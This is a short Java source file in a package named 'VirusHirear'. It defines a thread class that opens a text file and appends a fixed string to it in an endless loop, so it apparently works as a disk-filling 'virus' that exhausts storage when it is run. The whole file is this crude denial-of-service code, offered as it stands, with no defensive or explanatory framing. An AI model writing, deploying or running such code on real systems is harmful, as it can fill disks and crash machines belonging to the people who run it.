package VirusHirear;

import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ThreWorker implements Runnable{

    private Thread t;
    private String threadName;
    private String Fi;

   ThreWorker(String name,String path,int fileno) {
        threadName=name;
        Fi=path+"/file"+fileno+"";
        
        
        System.out.println("Creating "+Fi+" " + threadName);
    }
    public void run() {
        try {
            System.out.println("********");
            System.out.print("the file : ");
            System.err.print(Fi);
            System.out.print(" is ready to be created");
            FileWriter f = new FileWriter(Fi+".txt", true);
            while (true) {
                f.write("Programming Is Such A FUN !!!");
            }
        } catch (FileNotFoundException e) {
            System.err.println("Not able to create "+Fi);
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
    }
    }
    

    public void start() {
        System.out.println("Starting " + threadName);
        if (t == null) {
            t = new Thread(this, threadName);
            t.start();
        }
    }

}




    